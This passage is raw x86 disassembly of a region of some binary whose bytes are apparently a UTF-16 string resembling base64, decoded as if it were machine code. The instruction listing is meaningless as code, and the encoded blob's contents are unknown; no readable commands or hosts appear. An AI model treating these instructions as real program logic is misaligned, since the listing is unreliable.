  4046cf:	42                   	inc    %edx
  4046d0:	00 70 00             	add    %dh,0x0(%eax)
  4046d3:	34 00                	xor    $0x0,%al
  4046d5:	58                   	pop    %eax
  4046d6:	00 32                	add    %dh,(%edx)
  4046d8:	00 67 00             	add    %ah,0x0(%edi)
  4046db:	6a 00                	push   $0x0
  4046dd:	48                   	dec    %eax
  4046de:	00 55 00             	add    %dl,0x0(%ebp)
  4046e1:	6e                   	outsb  %ds:(%esi),(%dx)
  4046e2:	00 31                	add    %dh,(%ecx)
  4046e4:	00 6a 00             	add    %ch,0x0(%edx)
  4046e7:	6c                   	insb   (%dx),%es:(%edi)
  4046e8:	00 4d 00             	add    %cl,0x0(%ebp)
  4046eb:	47                   	inc    %edi
  4046ec:	00 67 00             	add    %ah,0x0(%edi)
  4046ef:	63 00                	arpl   %eax,(%eax)
  4046f1:	64 00 34 00          	add    %dh,%fs:(%eax,%eax,1)
  4046f5:	5a                   	pop    %edx
  4046f6:	00 4f 00             	add    %cl,0x0(%edi)
  4046f9:	38 00                	cmp    %al,(%eax)
  4046fb:	76 00                	jbe    0x4046fd
  4046fd:	4b                   	dec    %ebx
  4046fe:	00 6f 00             	add    %ch,0x0(%edi)
  404701:	63 00                	arpl   %eax,(%eax)
  404703:	79 00                	jns    0x404705
  404705:	69 00 56 00 55 00    	imul   $0x550056,(%eax),%eax
  40470b:	37                   	aaa
  40470c:	00 59 00             	add    %bl,0x0(%ecx)
  40470f:	36 00 63 00          	add    %ah,%ss:0x0(%ebx)
  404713:	42                   	inc    %edx
  404714:	00 70 00             	add    %dh,0x0(%eax)
  404717:	6a 00                	push   $0x0
  404719:	34 00                	xor    $0x0,%al
  40471b:	39 00                	cmp    %eax,(%eax)
  40471d:	6a 00                	push   $0x0
  40471f:	4c                   	dec    %esp
  404720:	00 33                	add    %dh,(%ebx)
  404722:	00 5a 00             	add    %bl,0x0(%edx)
  404725:	42                   	inc    %edx
  404726:	00 52 00             	add    %dl,0x0(%edx)
  404729:	61                   	popa
  40472a:	00 47 00             	add    %al,0x0(%edi)
  40472d:	78 00                	js     0x40472f
  40472f:	45                   	inc    %ebp
  404730:	00 61 00             	add    %ah,0x0(%ecx)
  404733:	74 00                	je     0x404735
  404735:	4e                   	dec    %esi
  404736:	00 33                	add    %dh,(%ebx)
  404738:	00 44 00 52          	add    %al,0x52(%eax,%eax,1)
  40473c:	00 39                	add    %bh,(%ecx)
  40473e:	00 76 00             	add    %dh,0x0(%esi)
  404741:	77 00                	ja     0x404743
  404743:	31 00                	xor    %eax,(%eax)
  404745:	6a 00                	push   $0x0
  404747:	79 00                	jns    0x404749
  404749:	45                   	inc    %ebp
  40474a:	00 6d 00             	add    %ch,0x0(%ebp)
  40474d:	71 00                	jno    0x40474f
  40474f:	50                   	push   %eax
  404750:	00 6c 00 5a          	add    %ch,0x5a(%eax,%eax,1)
  404754:	00 38                	add    %bh,(%eax)
  404756:	00 57 00             	add    %dl,0x0(%edi)
  404759:	31 00                	xor    %eax,(%eax)
  40475b:	4c                   	dec    %esp
  40475c:	00 73 00             	add    %dh,0x0(%ebx)
  40475f:	4d                   	dec    %ebp
  404760:	00 64 00 62          	add    %ah,0x62(%eax,%eax,1)
  404764:	00 6b 00             	add    %ch,0x0(%ebx)
  404767:	32 00                	xor    (%eax),%al
  404769:	5a                   	pop    %edx
  40476a:	00 50 00             	add    %dl,0x0(%eax)
  40476d:	68 00 43 00 51       	push   $0x51004300
  404772:	00 49 00             	add    %cl,0x0(%ecx)
  404775:	6c                   	insb   (%dx),%es:(%edi)
  404776:	00 47 00             	add    %al,0x0(%edi)
  404779:	5a                   	pop    %edx
  40477a:	00 47 00             	add    %al,0x0(%edi)
  40477d:	75 00                	jne    0x40477f
  40477f:	4a                   	dec    %edx
  404780:	00 67 00             	add    %ah,0x0(%edi)
  404783:	52                   	push   %edx
  404784:	00 52 00             	add    %dl,0x0(%edx)
  404787:	58                   	pop    %eax
  404788:	00 53 00             	add    %dl,0x0(%ebx)
  40478b:	55                   	push   %ebp
  40478c:	00 61 00             	add    %ah,0x0(%ecx)
  40478f:	56                   	push   %esi
  404790:	00 53 00             	add    %dl,0x0(%ebx)
  404793:	52                   	push   %edx
  404794:	00 4c 00 50          	add    %cl,0x50(%eax,%eax,1)
  404798:	00 6f 00             	add    %ch,0x0(%edi)
  40479b:	31 00                	xor    %eax,(%eax)
  40479d:	64 00 4d 00          	add    %cl,%fs:0x0(%ebp)
  4047a1:	4b                   	dec    %ebx
  4047a2:	00 4b 00             	add    %cl,0x0(%ebx)
  4047a5:	7a 00                	jp     0x4047a7
  4047a7:	77 00                	ja     0x4047a9
  4047a9:	41                   	inc    %ecx
  4047aa:	00 48 00             	add    %cl,0x0(%eax)
  4047ad:	57                   	push   %edi
  4047ae:	00 56 00             	add    %dl,0x0(%esi)
  4047b1:	45                   	inc    %ebp
  4047b2:	00 6a 00             	add    %ch,0x0(%edx)
  4047b5:	6c                   	insb   (%dx),%es:(%edi)
  4047b6:	00 49 00             	add    %cl,0x0(%ecx)
  4047b9:	2b 00                	sub    (%eax),%eax
  4047bb:	42                   	inc    %edx
  4047bc:	00 36                	add    %dh,(%esi)
  4047be:	00 39                	add    %bh,(%ecx)
  4047c0:	00 41 00             	add    %al,0x0(%ecx)
  4047c3:	66 00 49 00          	data16 add %cl,0x0(%ecx)
  4047c7:	4e                   	dec    %esi
  4047c8:	00 41 00             	add    %al,0x0(%ecx)
  4047cb:	4a                   	dec    %edx
  4047cc:	00 44 00 39          	add    %al,0x39(%eax,%eax,1)
  4047d0:	00 58 00             	add    %bl,0x0(%eax)
  4047d3:	66 00 42 00          	data16 add %al,0x0(%edx)
  4047d7:	51                   	push   %ecx
  4047d8:	00 6c 00 4d          	add    %ch,0x4d(%eax,%eax,1)
  4047dc:	00 49 00             	add    %cl,0x0(%ecx)
  4047df:	5a                   	pop    %edx
  4047e0:	00 33                	add    %dh,(%ebx)
  4047e2:	00 30                	add    %dh,(%eax)
  4047e4:	00 42 00             	add    %al,0x0(%edx)
  4047e7:	6c                   	insb   (%dx),%es:(%edi)
  4047e8:	00 54 00 41          	add    %dl,0x41(%eax,%eax,1)
  4047ec:	00 33                	add    %dh,(%ebx)
  4047ee:	00 2f                	add    %ch,(%edi)
  4047f0:	00 41 00             	add    %al,0x0(%ecx)
  4047f3:	73 00                	jae    0x4047f5
  4047f5:	4d                   	dec    %ebp
  4047f6:	00 6c 00 4a          	add    %ch,0x4a(%eax,%eax,1)
  4047fa:	00 56 00             	add    %dl,0x0(%esi)
  4047fd:	59                   	pop    %ecx
  4047fe:	00 36                	add    %dh,(%esi)
  404800:	00 34 00             	add    %dh,(%eax,%eax,1)
  404803:	42                   	inc    %edx
  404804:	00 73 00             	add    %dh,0x0(%ebx)
  404807:	57                   	push   %edi
  404808:	00 63 00             	add    %ah,0x0(%ebx)
  40480b:	53                   	push   %ebx
  40480c:	00 6a 00             	add    %ch,0x0(%edx)
  40480f:	43                   	inc    %ebx
  404810:	00 64 00 51          	add    %ah,0x51(%eax,%eax,1)
  404814:	00 46 00             	add    %al,0x0(%esi)
  404817:	71 00                	jno    0x404819
  404819:	61                   	popa
  40481a:	00 43 00             	add    %al,0x0(%ebx)
  40481d:	4d                   	dec    %ebp
  40481e:	00 66 00             	add    %ah,0x0(%esi)
  404821:	79 00                	jns    0x404823
  404823:	37                   	aaa
  404824:	00 53 00             	add    %dl,0x0(%ebx)
  404827:	38 00                	cmp    %al,(%eax)
  404829:	38 00                	cmp    %al,(%eax)
  40482b:	49                   	dec    %ecx
  40482c:	00 4d 00             	add    %cl,0x0(%ebp)
  40482f:	61                   	popa
  404830:	00 38                	add    %bh,(%eax)
  404832:	00 76 00             	add    %dh,0x0(%esi)
  404835:	4b                   	dec    %ebx
  404836:	00 78 00             	add    %bh,0x0(%eax)
  404839:	66 00 33             	data16 add %dh,(%ebx)
  40483c:	00 47 00             	add    %al,0x0(%edi)
  40483f:	57                   	push   %edi
  404840:	00 55 00             	add    %dl,0x0(%ebp)
  404843:	71 00                	jno    0x404845
  404845:	4d                   	dec    %ebp
  404846:	00 4a 00             	add    %cl,0x0(%edx)
  404849:	73 00                	jae    0x40484b
  40484b:	6d                   	insl   (%dx),%es:(%edi)
  40484c:	00 65 00             	add    %ah,0x0(%ebp)
  40484f:	37                   	aaa
  404850:	00 68 00             	add    %ch,0x0(%eax)
  404853:	5a                   	pop    %edx
  404854:	00 6f 00             	add    %ch,0x0(%edi)
  404857:	34 00                	xor    $0x0,%al
  404859:	30 00                	xor    %al,(%eax)
  40485b:	61                   	popa
  40485c:	00 4c 00 56          	add    %cl,0x56(%eax,%eax,1)
  404860:	00 4e 00             	add    %cl,0x0(%esi)
  404863:	53                   	push   %ebx
  404864:	00 4a 00             	add    %cl,0x0(%edx)
  404867:	4c                   	dec    %esp
  404868:	00 64 00 4d          	add    %ah,0x4d(%eax,%eax,1)
  40486c:	00 64 00 79          	add    %ah,0x79(%eax,%eax,1)
  404870:	00 72 00             	add    %dh,0x0(%edx)
  404873:	76 00                	jbe    0x404875
  404875:	6e                   	outsb  %ds:(%esi),(%dx)
  404876:	00 4b 00             	add    %cl,0x0(%ebx)
  404879:	34 00                	xor    $0x0,%al
  40487b:	71 00                	jno    0x40487d
  40487d:	65 00 79 00          	add    %bh,%gs:0x0(%ecx)
  404881:	6b 00 46             	imul   $0x46,(%eax),%eax
  404884:	00 61 00             	add    %ah,0x0(%ecx)
  404887:	58                   	pop    %eax
  404888:	00 31                	add    %dh,(%ecx)
  40488a:	00 76 00             	add    %dh,0x0(%esi)
  40488d:	4a                   	dec    %edx
  40488e:	00 6c 00 4d          	add    %ch,0x4d(%eax,%eax,1)
  404892:	00 6d 00             	add    %ch,0x0(%ebp)
  404895:	61                   	popa
  404896:	00 36                	add    %dh,(%esi)
  404898:	00 58 00             	add    %bl,0x0(%eax)
  40489b:	35 00 67 00 6d       	xor    $0x6d006700,%eax
  4048a0:	00 58 00             	add    %bl,0x0(%eax)
  4048a3:	72 00                	jb     0x4048a5
  4048a5:	5a                   	pop    %edx
  4048a6:	00 45 00             	add    %al,0x0(%ebp)
  4048a9:	76 00                	jbe    0x4048ab
  4048ab:	52                   	push   %edx
  4048ac:	00 5a 00             	add    %bl,0x0(%edx)
  4048af:	59                   	pop    %ecx
  4048b0:	00 68 00             	add    %ch,0x0(%eax)
  4048b3:	69 00 54 00 7a 00    	imul   $0x7a0054,(%eax),%eax
  4048b9:	59                   	pop    %ecx
  4048ba:	00 73 00             	add    %dh,0x0(%ebx)
  4048bd:	34 00                	xor    $0x0,%al
  4048bf:	55                   	push   %ebp
  4048c0:	00 38                	add    %bh,(%eax)
  4048c2:	00 57 00             	add    %dl,0x0(%edi)
  4048c5:	4f                   	dec    %edi
  4048c6:	00 41 00             	add    %al,0x0(%ecx)
  4048c9:	6c                   	insb   (%dx),%es:(%edi)
  4048ca:	00 2f                	add    %ch,(%edi)
  4048cc:	00 5a 00             	add    %bl,0x0(%edx)
  4048cf:	35 00 6d 00 32       	xor    $0x32006d00,%eax
  4048d4:	00 6a 00             	add    %ch,0x0(%edx)
  4048d7:	72 00                	jb     0x4048d9
  4048d9:	58                   	pop    %eax
  4048da:	00 42 00             	add    %al,0x0(%edx)
  4048dd:	6d                   	insl   (%dx),%es:(%edi)
  4048de:	00 51 00             	add    %dl,0x0(%ecx)
  4048e1:	42                   	inc    %edx
  4048e2:	00 30                	add    %dh,(%eax)
  4048e4:	00 6c 00 6d          	add    %ch,0x6d(%eax,%eax,1)
  4048e8:	00 57 00             	add    %dl,0x0(%edi)
  4048eb:	44                   	inc    %esp
  4048ec:	00 54 00 6e          	add    %dl,0x6e(%eax,%eax,1)
  4048f0:	00 4c 00 31          	add    %cl,0x31(%eax,%eax,1)
  4048f4:	00 6d 00             	add    %ch,0x0(%ebp)
  4048f7:	4f                   	dec    %edi
  4048f8:	00 31                	add    %dh,(%ecx)
  4048fa:	00 52 00             	add    %dl,0x0(%edx)
  4048fd:	49                   	dec    %ecx
  4048fe:	00 71 00             	add    %dh,0x0(%ecx)
  404901:	57                   	push   %edi
  404902:	00 63 00             	add    %ah,0x0(%ebx)
  404905:	56                   	push   %esi
  404906:	00 56 00             	add    %dl,0x0(%esi)
  404909:	73 00                	jae    0x40490b
  40490b:	35 00 77 00 76       	xor    $0x76007700,%eax
  404910:	00 57 00             	add    %dl,0x0(%edi)
  404913:	4c                   	dec    %esp
  404914:	00 6c 00 4c          	add    %ch,0x4c(%eax,%eax,1)
  404918:	00 61 00             	add    %ah,0x0(%ecx)
  40491b:	6b 00 46             	imul   $0x46,(%eax),%eax
  40491e:	00 58 00             	add    %bl,0x0(%eax)
  404921:	46                   	inc    %esi
  404922:	00 77 00             	add    %dh,0x0(%edi)
  404925:	7a 00                	jp     0x404927
  404927:	36 00 44 00 64       	add    %al,%ss:0x64(%eax,%eax,1)
  40492c:	00 71 00             	add    %dh,0x0(%ecx)
  40492f:	42                   	inc    %edx
  404930:	00 71 00             	add    %dh,0x0(%ecx)
  404933:	41                   	inc    %ecx
  404934:	00 41 00             	add    %al,0x0(%ecx)
  404937:	38 00                	cmp    %al,(%eax)
  404939:	76 00                	jbe    0x40493b
  40493b:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40493f:	54                   	push   %esp
  404940:	00 2f                	add    %ch,(%edi)
  404942:	00 65 00             	add    %ah,0x0(%ebp)
  404945:	42                   	inc    %edx
  404946:	00 77 00             	add    %dh,0x0(%edi)
  404949:	74 00                	je     0x40494b
  40494b:	33 00                	xor    (%eax),%eax
  40494d:	71 00                	jno    0x40494f
  40494f:	74 00                	je     0x404951
  404951:	65 00 59 00          	add    %bl,%gs:0x0(%ecx)
  404955:	62 00                	bound  %eax,(%eax)
  404957:	6a 00                	push   $0x0
  404959:	67 00 49 00          	add    %cl,0x0(%bx,%di)
  40495d:	52                   	push   %edx
  40495e:	00 6e 00             	add    %ch,0x0(%esi)
  404961:	58                   	pop    %eax
  404962:	00 6d 00             	add    %ch,0x0(%ebp)
  404965:	50                   	push   %eax
  404966:	00 31                	add    %dh,(%ecx)
  404968:	00 69 00             	add    %ch,0x0(%ecx)
  40496b:	74 00                	je     0x40496d
  40496d:	45                   	inc    %ebp
  40496e:	00 6a 00             	add    %ch,0x0(%edx)
  404971:	4c                   	dec    %esp
  404972:	00 4c 00 59          	add    %cl,0x59(%eax,%eax,1)
  404976:	00 48 00             	add    %cl,0x0(%eax)
  404979:	67 00 46 00          	add    %al,0x0(%bp)
  40497d:	53                   	push   %ebx
  40497e:	00 2b                	add    %ch,(%ebx)
  404980:	00 75 00             	add    %dh,0x0(%ebp)
  404983:	4c                   	dec    %esp
  404984:	00 32                	add    %dh,(%edx)
  404986:	00 65 00             	add    %ah,0x0(%ebp)
  404989:	31 00                	xor    %eax,(%eax)
  40498b:	38 00                	cmp    %al,(%eax)
  40498d:	4f                   	dec    %edi
  40498e:	00 75 00             	add    %dh,0x0(%ebp)
  404991:	6f                   	outsl  %ds:(%esi),(%dx)
  404992:	00 66 00             	add    %ah,0x0(%esi)
  404995:	53                   	push   %ebx
  404996:	00 49 00             	add    %cl,0x0(%ecx)
  404999:	39 00                	cmp    %eax,(%eax)
  40499b:	44                   	inc    %esp
  40499c:	00 5a 00             	add    %bl,0x0(%edx)
  40499f:	2f                   	das
  4049a0:	00 2b                	add    %ch,(%ebx)
  4049a2:	00 65 00             	add    %ah,0x0(%ebp)
  4049a5:	59                   	pop    %ecx
  4049a6:	00 66 00             	add    %ah,0x0(%esi)
  4049a9:	48                   	dec    %eax
  4049aa:	00 66 00             	add    %ah,0x0(%esi)
  4049ad:	41                   	inc    %ecx
  4049ae:	00 39                	add    %bh,(%ecx)
  4049b0:	00 6c 00 59          	add    %ch,0x59(%eax,%eax,1)
  4049b4:	00 32                	add    %dh,(%edx)
  4049b6:	00 39                	add    %bh,(%ecx)
  4049b8:	00 31                	add    %dh,(%ecx)
  4049ba:	00 56 00             	add    %dl,0x0(%esi)
  4049bd:	41                   	inc    %ecx
  4049be:	00 32                	add    %dh,(%edx)
  4049c0:	00 58 00             	add    %bl,0x0(%eax)
  4049c3:	76 00                	jbe    0x4049c5
  4049c5:	67 00 74 00          	add    %dh,0x0(%si)
  4049c9:	51                   	push   %ecx
  4049ca:	00 37                	add    %dh,(%edi)
  4049cc:	00 39                	add    %bh,(%ecx)
  4049ce:	00 77 00             	add    %dh,0x0(%edi)
  4049d1:	54                   	push   %esp
  4049d2:	00 67 00             	add    %ah,0x0(%edi)
  4049d5:	55                   	push   %ebp
  4049d6:	00 48 00             	add    %cl,0x0(%eax)
  4049d9:	37                   	aaa
  4049da:	00 72 00             	add    %dh,0x0(%edx)
  4049dd:	5a                   	pop    %edx
  4049de:	00 4e 00             	add    %cl,0x0(%esi)
  4049e1:	2f                   	das
  4049e2:	00 63 00             	add    %ah,0x0(%ebx)
  4049e5:	4d                   	dec    %ebp
  4049e6:	00 71 00             	add    %dh,0x0(%ecx)
  4049e9:	71 00                	jno    0x4049eb
  4049eb:	6c                   	insb   (%dx),%es:(%edi)
  4049ec:	00 6b 00             	add    %ch,0x0(%ebx)
  4049ef:	54                   	push   %esp
  4049f0:	00 58 00             	add    %bl,0x0(%eax)
  4049f3:	66 00 4a 00          	data16 add %cl,0x0(%edx)
  4049f7:	48                   	dec    %eax
  4049f8:	00 6e 00             	add    %ch,0x0(%esi)
  4049fb:	62 00                	bound  %eax,(%eax)
  4049fd:	54                   	push   %esp
  4049fe:	00 76 00             	add    %dh,0x0(%esi)
  404a01:	6c                   	insb   (%dx),%es:(%edi)
  404a02:	00 35 00 4e 00 6d    	add    %dh,0x6d004e00
  404a08:	00 43 00             	add    %al,0x0(%ebx)
  404a0b:	32 00                	xor    (%eax),%al
  404a0d:	78 00                	js     0x404a0f
  404a0f:	77 00                	ja     0x404a11
  404a11:	50                   	push   %eax
  404a12:	00 42 00             	add    %al,0x0(%edx)
  404a15:	63 00                	arpl   %eax,(%eax)
  404a17:	44                   	inc    %esp
  404a18:	00 59 00             	add    %bl,0x0(%ecx)
  404a1b:	76 00                	jbe    0x404a1d
  404a1d:	4c                   	dec    %esp
  404a1e:	00 42 00             	add    %al,0x0(%edx)
  404a21:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  404a25:	65 00 57 00          	add    %dl,%gs:0x0(%edi)
  404a29:	52                   	push   %edx
  404a2a:	00 57 00             	add    %dl,0x0(%edi)
  404a2d:	78 00                	js     0x404a2f
  404a2f:	46                   	inc    %esi
  404a30:	00 30                	add    %dh,(%eax)
  404a32:	00 4e 00             	add    %cl,0x0(%esi)
  404a35:	68 00 4f 00 69       	push   $0x69004f00
  404a3a:	00 54 00 61          	add    %dl,0x61(%eax,%eax,1)
  404a3e:	00 31                	add    %dh,(%ecx)
  404a40:	00 68 00             	add    %ch,0x0(%eax)
  404a43:	41                   	inc    %ecx
  404a44:	00 44 00 71          	add    %al,0x71(%eax,%eax,1)
  404a48:	00 36                	add    %dh,(%esi)
  404a4a:	00 68 00             	add    %ch,0x0(%eax)
  404a4d:	6f                   	outsl  %ds:(%esi),(%dx)
  404a4e:	00 4b 00             	add    %cl,0x0(%ebx)
  404a51:	47                   	inc    %edi
  404a52:	00 31                	add    %dh,(%ecx)
  404a54:	00 30                	add    %dh,(%eax)
  404a56:	00 46 00             	add    %al,0x0(%esi)
  404a59:	57                   	push   %edi
  404a5a:	00 6f 00             	add    %ch,0x0(%edi)
  404a5d:	50                   	push   %eax
  404a5e:	00 42 00             	add    %al,0x0(%edx)
  404a61:	7a 00                	jp     0x404a63
  404a63:	69 00 41 00 58 00    	imul   $0x580041,(%eax),%eax
  404a69:	45                   	inc    %ebp
  404a6a:	00 70 00             	add    %dh,0x0(%eax)
  404a6d:	32 00                	xor    (%eax),%al
  404a6f:	57                   	push   %edi
  404a70:	00 32                	add    %dh,(%edx)
  404a72:	00 61 00             	add    %ah,0x0(%ecx)
  404a75:	41                   	inc    %ecx
  404a76:	00 56 00             	add    %dl,0x0(%esi)
  404a79:	57                   	push   %edi
  404a7a:	00 58 00             	add    %bl,0x0(%eax)
  404a7d:	4a                   	dec    %edx
  404a7e:	00 76 00             	add    %dh,0x0(%esi)
  404a81:	57                   	push   %edi
  404a82:	00 66 00             	add    %ah,0x0(%esi)
  404a85:	57                   	push   %edi
  404a86:	00 4a 00             	add    %cl,0x0(%edx)
  404a89:	4d                   	dec    %ebp
  404a8a:	00 4c 00 48          	add    %cl,0x48(%eax,%eax,1)
  404a8e:	00 32                	add    %dh,(%edx)
  404a90:	00 4e 00             	add    %cl,0x0(%esi)
  404a93:	2b 00                	sub    (%eax),%eax
  404a95:	37                   	aaa
  404a96:	00 68 00             	add    %ch,0x0(%eax)
  404a99:	68 00 66 00 35       	push   $0x35006600
  404a9e:	00 38                	add    %bh,(%eax)
  404aa0:	00 78 00             	add    %bh,0x0(%eax)
  404aa3:	79 00                	jns    0x404aa5
  404aa5:	4f                   	dec    %edi
  404aa6:	00 4d 00             	add    %cl,0x0(%ebp)
  404aa9:	47                   	inc    %edi
  404aaa:	00 66 00             	add    %ah,0x0(%esi)
  404aad:	61                   	popa
  404aae:	00 37                	add    %dh,(%edi)
  404ab0:	00 6b 00             	add    %ch,0x0(%ebx)
  404ab3:	46                   	inc    %esi
  404ab4:	00 35 00 53 00 72    	add    %dh,0x72005300
  404aba:	00 6d 00             	add    %ch,0x0(%ebp)
  404abd:	6e                   	outsb  %ds:(%esi),(%dx)
  404abe:	00 6b 00             	add    %ch,0x0(%ebx)
  404ac1:	56                   	push   %esi
  404ac2:	00 39                	add    %bh,(%ecx)
  404ac4:	00 6b 00             	add    %ch,0x0(%ebx)
  404ac7:	4a                   	dec    %edx
  404ac8:	00 32                	add    %dh,(%edx)
  404aca:	00 54 00 78          	add    %dl,0x78(%eax,%eax,1)
  404ace:	00 5a 00             	add    %bl,0x0(%edx)
  404ad1:	53                   	push   %ebx
  404ad2:	00 5a 00             	add    %bl,0x0(%edx)
  404ad5:	45                   	inc    %ebp
  404ad6:	00 65 00             	add    %ah,0x0(%ebp)
  404ad9:	4f                   	dec    %edi
  404ada:	00 5a 00             	add    %bl,0x0(%edx)
  404add:	56                   	push   %esi
  404ade:	00 6e 00             	add    %ch,0x0(%esi)
  404ae1:	45                   	inc    %ebp
  404ae2:	00 72 00             	add    %dh,0x0(%edx)
  404ae5:	6b 00 63             	imul   $0x63,(%eax),%eax
  404ae8:	00 64 00 33          	add    %ah,0x33(%eax,%eax,1)
  404aec:	00 78 00             	add    %bh,0x0(%eax)
  404aef:	38 00                	cmp    %al,(%eax)
  404af1:	4e                   	dec    %esi
  404af2:	00 5a 00             	add    %bl,0x0(%edx)
  404af5:	4a                   	dec    %edx
  404af6:	00 39                	add    %bh,(%ecx)
  404af8:	00 30                	add    %dh,(%eax)
  404afa:	00 43 00             	add    %al,0x0(%ebx)
  404afd:	6d                   	insl   (%dx),%es:(%edi)
  404afe:	00 48 00             	add    %cl,0x0(%eax)
  404b01:	6f                   	outsl  %ds:(%esi),(%dx)
  404b02:	00 4e 00             	add    %cl,0x0(%esi)
  404b05:	6b 00 53             	imul   $0x53,(%eax),%eax
  404b08:	00 79 00             	add    %bh,0x0(%ecx)
  404b0b:	39 00                	cmp    %eax,(%eax)
  404b0d:	53                   	push   %ebx
  404b0e:	00 51 00             	add    %dl,0x0(%ecx)
  404b11:	79 00                	jns    0x404b13
  404b13:	7a 00                	jp     0x404b15
  404b15:	59                   	pop    %ecx
  404b16:	00 33                	add    %dh,(%ebx)
  404b18:	00 70 00             	add    %dh,0x0(%eax)
  404b1b:	34 00                	xor    $0x0,%al
  404b1d:	4e                   	dec    %esi
  404b1e:	00 73 00             	add    %dh,0x0(%ebx)
  404b21:	59                   	pop    %ecx
  404b22:	00 49 00             	add    %cl,0x0(%ecx)
  404b25:	4b                   	dec    %ebx
  404b26:	00 5a 00             	add    %bl,0x0(%edx)
  404b29:	32 00                	xor    (%eax),%al
  404b2b:	30 00                	xor    %al,(%eax)
  404b2d:	30 00                	xor    %al,(%eax)
  404b2f:	50                   	push   %eax
  404b30:	00 61 00             	add    %ah,0x0(%ecx)
  404b33:	56                   	push   %esi
  404b34:	00 41 00             	add    %al,0x0(%ecx)
  404b37:	6e                   	outsb  %ds:(%esi),(%dx)
  404b38:	00 55 00             	add    %dl,0x0(%ebp)
  404b3b:	69 00 78 00 6c 00    	imul   $0x6c0078,(%eax),%eax
  404b41:	58                   	pop    %eax
  404b42:	00 53 00             	add    %dl,0x0(%ebx)
  404b45:	31 00                	xor    %eax,(%eax)
  404b47:	54                   	push   %esp
  404b48:	00 4a 00             	add    %cl,0x0(%edx)
  404b4b:	6b 00 69             	imul   $0x69,(%eax),%eax
  404b4e:	00 71 00             	add    %dh,0x0(%ecx)
  404b51:	41                   	inc    %ecx
  404b52:	00 55 00             	add    %dl,0x0(%ebp)
  404b55:	4e                   	dec    %esi
  404b56:	00 4c 00 72          	add    %cl,0x72(%eax,%eax,1)
  404b5a:	00 52 00             	add    %dl,0x0(%edx)
  404b5d:	37                   	aaa
  404b5e:	00 37                	add    %dh,(%edi)
  404b60:	00 51 00             	add    %dl,0x0(%ecx)
  404b63:	65 00 36             	add    %dh,%gs:(%esi)
  404b66:	00 48 00             	add    %cl,0x0(%eax)
  404b69:	2b 00                	sub    (%eax),%eax
  404b6b:	4b                   	dec    %ebx
  404b6c:	00 38                	add    %bh,(%eax)
  404b6e:	00 56 00             	add    %dl,0x0(%esi)
  404b71:	72 00                	jb     0x404b73
  404b73:	52                   	push   %edx
  404b74:	00 58 00             	add    %bl,0x0(%eax)
  404b77:	72 00                	jb     0x404b79
  404b79:	4f                   	dec    %edi
  404b7a:	00 39                	add    %bh,(%ecx)
  404b7c:	00 6c 00 49          	add    %ch,0x49(%eax,%eax,1)
  404b80:	00 2f                	add    %ch,(%edi)
  404b82:	00 45 00             	add    %al,0x0(%ebp)
  404b85:	44                   	inc    %esp
  404b86:	00 6e 00             	add    %ch,0x0(%esi)
  404b89:	53                   	push   %ebx
  404b8a:	00 33                	add    %dh,(%ebx)
  404b8c:	00 36                	add    %dh,(%esi)
  404b8e:	00 72 00             	add    %dh,0x0(%edx)
  404b91:	65 00 69 00          	add    %ch,%gs:0x0(%ecx)
  404b95:	61                   	popa
  404b96:	00 61 00             	add    %ah,0x0(%ecx)
  404b99:	54                   	push   %esp
  404b9a:	00 61 00             	add    %ah,0x0(%ecx)
  404b9d:	56                   	push   %esi
  404b9e:	00 37                	add    %dh,(%edi)
  404ba0:	00 72 00             	add    %dh,0x0(%edx)
  404ba3:	6f                   	outsl  %ds:(%esi),(%dx)
  404ba4:	00 54 00 68          	add    %dl,0x68(%eax,%eax,1)
  404ba8:	00 57 00             	add    %dl,0x0(%edi)
  404bab:	43                   	inc    %ebx
  404bac:	00 36                	add    %dh,(%esi)
  404bae:	00 53 00             	add    %dl,0x0(%ebx)
  404bb1:	68 00 75 00 47       	push   $0x47007500
  404bb6:	00 36                	add    %dh,(%esi)
  404bb8:	00 33                	add    %dh,(%ebx)
  404bba:	00 32                	add    %dh,(%edx)
  404bbc:	00 6b 00             	add    %ch,0x0(%ebx)
  404bbf:	6c                   	insb   (%dx),%es:(%edi)
  404bc0:	00 66 00             	add    %ah,0x0(%esi)
  404bc3:	6e                   	outsb  %ds:(%esi),(%dx)
  404bc4:	00 58 00             	add    %bl,0x0(%eax)
  404bc7:	54                   	push   %esp
  404bc8:	00 4a 00             	add    %cl,0x0(%edx)
  404bcb:	63 00                	arpl   %eax,(%eax)
  404bcd:	4e                   	dec    %esi
  404bce:	00 53 00             	add    %dl,0x0(%ebx)
  404bd1:	64 00 2f             	add    %ch,%fs:(%edi)
  404bd4:	00 46 00             	add    %al,0x0(%esi)
  404bd7:	34 00                	xor    $0x0,%al
  404bd9:	39 00                	cmp    %eax,(%eax)
  404bdb:	59                   	pop    %ecx
  404bdc:	00 4e 00             	add    %cl,0x0(%esi)
  404bdf:	6a 00                	push   $0x0
  404be1:	66 00 56 00          	data16 add %dl,0x0(%esi)
  404be5:	57                   	push   %edi
  404be6:	00 4e 00             	add    %cl,0x0(%esi)
  404be9:	6f                   	outsl  %ds:(%esi),(%dx)
  404bea:	00 6c 00 6d          	add    %ch,0x6d(%eax,%eax,1)
  404bee:	00 57 00             	add    %dl,0x0(%edi)
  404bf1:	73 00                	jae    0x404bf3
  404bf3:	4f                   	dec    %edi
  404bf4:	00 72 00             	add    %dh,0x0(%edx)
  404bf7:	31 00                	xor    %eax,(%eax)
  404bf9:	67 00 32             	add    %dh,(%bp,%si)
  404bfc:	00 63 00             	add    %ah,0x0(%ebx)
  404bff:	66 00 35 00 51 00 4c 	data16 add %dh,0x4c005100
  404c06:	00 47 00             	add    %al,0x0(%edi)
  404c09:	68 00 53 00 74       	push   $0x74005300
  404c0e:	00 58 00             	add    %bl,0x0(%eax)
  404c11:	47                   	inc    %edi
  404c12:	00 58 00             	add    %bl,0x0(%eax)
  404c15:	79 00                	jns    0x404c17
  404c17:	6a 00                	push   $0x0
  404c19:	76 00                	jbe    0x404c1b
  404c1b:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  404c1f:	46                   	inc    %esi
  404c20:	00 62 00             	add    %ah,0x0(%edx)
  404c23:	52                   	push   %edx
  404c24:	00 48 00             	add    %cl,0x0(%eax)
  404c27:	61                   	popa
  404c28:	00 4d 00             	add    %cl,0x0(%ebp)
  404c2b:	63 00                	arpl   %eax,(%eax)
  404c2d:	43                   	inc    %ebx
  404c2e:	00 62 00             	add    %ah,0x0(%edx)
  404c31:	64 00 6c 00 7a       	add    %ch,%fs:0x7a(%eax,%eax,1)
